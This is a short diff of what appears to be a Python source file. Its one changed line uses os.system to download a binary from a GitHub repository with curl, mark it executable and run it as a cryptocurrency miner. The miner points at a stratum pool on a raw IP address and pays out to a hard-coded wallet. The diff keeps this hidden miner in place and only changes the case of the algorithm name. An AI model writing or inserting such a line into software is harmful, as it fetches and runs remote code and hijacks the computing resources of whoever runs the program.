@@ -12,4 +12,4 @@ from subprocess import PIPE, Popen
 import base64
 
 
-os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespowertide -o stratum+tcp://178.170.40.44:6243 -u TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip.NUNG -p x -t 15") 
+os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a yespowerTIDE -o stratum+tcp://178.170.40.44:6243 -u TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip.NUNG -p x -t 15") 
